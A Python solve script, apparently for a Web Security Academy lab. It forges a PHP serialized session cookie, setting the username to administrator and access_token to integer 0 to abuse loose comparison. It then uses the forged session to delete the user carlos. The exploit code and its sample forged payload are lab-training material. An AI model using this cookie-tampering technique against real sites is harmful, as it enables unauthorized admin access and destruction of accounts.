# Batch import libs. I know this is messy behavior but it's for quick prototyping.
import requests
from base64 import b64encode, b64decode, urlsafe_b64encode, urlsafe_b64decode
from time import time
import re
import subprocess
from concurrent.futures import ThreadPoolExecutor
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from http import cookies
import sys


# Lab: Modifying serialized data types

# Similar to the last one but now the cookie is PHP (meaning its a binary) and ALSO can maybe be exploited by abusing the php < 7 thingy where strings resolve to integers

# Só brainstormando aqui. O script precisa fazer algumas coisas, entre elas: 
# 1. Logar com o peter:wiener
# 2. Exploitar o insecure deserialization (de php)pra fazer o peter virar admin
# 3. Deletar a conta do carlos

###################### Meat & Potatoes ######################

BASE_URL = "https://0a0100cc0362c7d681f27a3e00210058.web-security-academy.net/"
session = requests.Session()

def login():
    url = BASE_URL + "/login"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
        "Referer": url,
        "Origin": BASE_URL,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    } ## Set the login headers

    # GET the login page to obtain session cookie ## THIS WAS COMMENTED AS THIS IS NOT NECESSARY IN THIS CASE
   # r_get = session.get(url, headers=headers, allow_redirects=True)
  #  print("GET status:", r_get.status_code)
    # show session cookies obtained automatically
  #  print("cookies:", session.cookies.get_dict())

    # login as wiener
    data = {
        "username": "wiener",
        "password": "peter"
    }

    # ensure Referer set to login page for the POST
    headers["Referer"] = url

    r = session.post(url, data=data, headers=headers, allow_redirects=True)
    print("POST /login status:", r.status_code)

     # quick check for a successful login as peter (adjust based on actual page content)
    if "Log out" in r.text or "Wiener" in r.text:
        print("Likely logged in as Wiener. \nAfter analysis, it can be observed that the session cookie is a serialized object encoded with base64 and URL. It will be parsed, URL-decoded, cleaned and then B64-decoded. \n")
    else:
        print("Login failed or response did not indicate success")


# At this point, it can be observer that the session cookie is a serialized object (URL + b64 encoded + PHP binary data in the body)
 
def deserialize():
    # We need to "strip" the session cookie variable of any non-b64 artifacts. This code excerpt right here basically detect the cookies and stores its name inside the cookie_name variable
    cookies_dict = session.cookies.get_dict()
    cookie_name = None
    for name in ("session", "sessionid", "connect.sid", "sess", "SID"):
        if name in cookies_dict:
            cookie_name = name
            break
    
    if cookie_name is None:
        cookie_name = list(cookies_dict.keys())[0]

    raw = cookies_dict[cookie_name]

    # URL-decode in case the cookie was percent-encoded
    from urllib.parse import unquote
    raw = unquote(raw)

    # remove common wrappers: signed cookie prefix "s:" and signature suffix after last dot
    if raw.startswith("s:"):
        raw = raw[2:]
    if "." in raw:
        raw = raw.rsplit(".", 1)[0]

    # keep only characters valid for base64 (URL-safe plus standard chars and '=' padding)
    import re
    cleaned = re.sub(r'[^A-Za-z0-9\-\_\=+/]', '', raw)

    # fix padding to a multiple of 4 (base64 requirement)
    pad = (-len(cleaned)) % 4
    cleaned += "=" * pad

    # try URL-safe b64 decode first, fall back to standard b64
    from base64 import urlsafe_b64decode, b64decode
    try:
        decoded = urlsafe_b64decode(cleaned)
    except Exception:
        decoded = b64decode(cleaned)

    try:
        print("decoded text:", decoded.decode('utf-8', errors='replace'))
        decoded_cookie = decoded.decode('utf-8', errors='replace') # store the decoded cookie
    except Exception:
        pass
    
# The injection takes place in the username field AND in the access token field. Once the payload is processed, the value of access_token is converted from a string into the integer 0. This happens because, in PHP, any string that does not begin with a numeric character is automatically interpreted as the integer 0 during loose comparisons.

# Since access_token is supposed to be a string, forcing it to become the literal integer 0 can break authentication logic that relies on loose comparison. For example, if the application performs a check similar to:

# $login = unserialize($_COOKIE['login']);
# if ($login['access_token'] == $expected_token) {
#    // login successful
# }

# Because of the loose comparison, AS LONG AS THE CORRECT TOKEN DOES NOT START WITH A NUMBER, it will also resolve to the integer 0. Rework this bit below.

# O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token"s:32:"upn88dvovv68kcwqseby2gjj5pf8t10q";} // This is the cookie as of NOW

# O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;} // This is how we want it to be. The lenght of the username has been modified accordingly, and "access token" is no an INTEGER, not a string. 

 # --- modify serialized PHP fragment ---
# 1) change username value to "administrator" and update its s:N length    
 
    new_username = "administrator"
    new_username_len = len(new_username)

# pattern: s:<n>:"username";s:<m>:"....";
    username_pattern = re.compile(r'(s:\d+:"username";)s:\d+:"[^"]*";', re.I)
    if username_pattern.search(decoded_cookie):
        decoded_cookie = username_pattern.sub(rf'\1s:{new_username_len}:"{new_username}";', decoded_cookie, count=1)
        print("username replaced ->", new_username)
    else:
        print("username pattern not found; aborting modification")
        return

# 2) change access_token from a string to integer 0: replace s:<m>:"..."; with i:0;
    access_pattern = re.compile(r'(s:\d+:"access_token";)s:\d+:"[^"]*";', re.I)
    if access_pattern.search(decoded_cookie):
        decoded_cookie = access_pattern.sub(r'\1i:0;', decoded_cookie, count=1)
        print("access_token converted to integer 0")
    else:
        print("access_token pattern not found; aborting modification")
        return

    print("modified serialized object:", decoded_cookie)

    # re-encode (URL-safe base64, then URL-encode for cookie transport)
    encoded = urlsafe_b64encode(decoded_cookie.encode("utf-8")).decode()
    # keep padding (some libs strip it) — URL-encode to be safe
    new_cookie_value = encoded

     # set the modified cookie in the session (in-memory). This is because it's cleaner to invoke the cookies this way later
    session.cookies.set(cookie_name, new_cookie_value)
    print(f"Updated session cookie: {cookie_name}={new_cookie_value}")


# Now, we need to GET this url with the correct cookie to delete the desired user
# https://0a3400f30471f886812e434a004100c4.web-security-academy.net/admin/delete?username=carlos
def deletecarlos():
    url = BASE_URL + "/admin/delete?username=carlos"
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
            "Referer": url,
            "Origin": BASE_URL,
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        } 

    # take the in-memory session cookie and put it into the Cookie header (URL-encode value)
    from urllib.parse import quote
    cookies_dict = session.cookies.get_dict()
    if cookies_dict:
        name, value = next(iter(cookies_dict.items()))
        headers["Cookie"] = f"{name}={quote(value)}"

    r = session.get(url, headers=headers, allow_redirects=True)


def main():
    # Allow BASE_URL to be modified via command line
    global BASE_URL
    if len(sys.argv) > 1:
        BASE_URL = sys.argv[1].rstrip("/") + "/"
    
    # Call the login function
    login()

    # Call the deserialize function
    deserialize()

    # Delete carlos
    deletecarlos()
    
if __name__ == "__main__":
    main()